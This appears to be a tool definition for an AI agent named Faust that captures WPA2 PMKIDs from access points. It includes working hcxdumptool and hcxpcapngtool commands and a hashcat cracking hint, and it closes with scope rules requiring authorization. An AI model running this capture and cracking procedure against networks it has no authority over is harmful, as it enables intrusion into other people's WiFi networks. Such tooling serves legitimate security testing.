---
name: wifi_pmkid_capture
description: >
  Capture a PMKID from an access point's first EAPOL frame. No handshake
  required — only needs the AP to respond. Faster and more reliable than
  handshake capture. Output is hashcat-compatible for offline cracking.
parameters_schema:
  type: object
  properties:
    interface:
      type: string
      description: Monitor-mode WiFi interface (e.g. wlan1mon)
    bssid:
      type: string
      description: Target access point BSSID
    channel:
      type: integer
      description: Channel of the target AP
    timeout_s:
      type: integer
      description: How long to probe before giving up. Default 30.
  required:
    - interface
    - bssid
    - channel
sensitivity: active
allowed_tools:
  - wifi_pmkid_capture
---

# WiFi PMKID Capture

Exploits a RSN IE leak in the first EAPOL frame from many WPA2-PSK access
points. When Faust associates, the AP sends an EAPOL message containing the
PMKID — a hash derived from the PSK. This is crackable offline without
waiting for a client to reconnect.

## What it returns

```json
{
  "captured": true,
  "bssid": "aa:bb:cc:dd:ee:ff",
  "ssid": "TargetNet",
  "pmkid": "a3c7b2d1e4f58a09c6b7d8e9f0a1b2c3",
  "hash_file": "captures/pmkid_aabbccddeeff_1745174400.22000",
  "crack_hint": "hashcat -m 22000 <hash_file> wordlist.txt"
}
```

## Hardware

- **ALFA AWUS036ACM** (MT7612U) in monitor mode

## Implementation notes

Uses `hcxdumptool` (the standard PMKID capture tool) or `bettercap`'s
`wifi.assoc` module. hcxdumptool is lower-level and more reliable:

```
sudo hcxdumptool -i wlan1mon --filterlist_ap=<bssid> \
                 --filtermode=2 -o capture.pcapng
sudo hcxpcapngtool -o hash.22000 capture.pcapng
```

The resulting hash.22000 file is directly hashcat-compatible (mode 22000).

## Why PMKID > handshake

- **No client needed.** Handshake capture requires a live client to reconnect.
  PMKID works against an AP with zero clients.
- **No deauth needed.** Doesn't require the disruptive deauth step.
- **Faster.** Single EAPOL exchange vs. full 4-way.
- **Higher reliability.** ~70% of APs leak PMKID vs. handshake timing issues.

Downside: some modern APs (especially WPA3) don't include the PMKID in their
initial EAPOL frame. Handshake capture is the fallback.

## Scope requirements

- Operator must have authorization to capture PMKIDs on this network
- Offline cracking the PMKID is legally distinct from capture — both require
  authorization
- Testing on owned infrastructure only
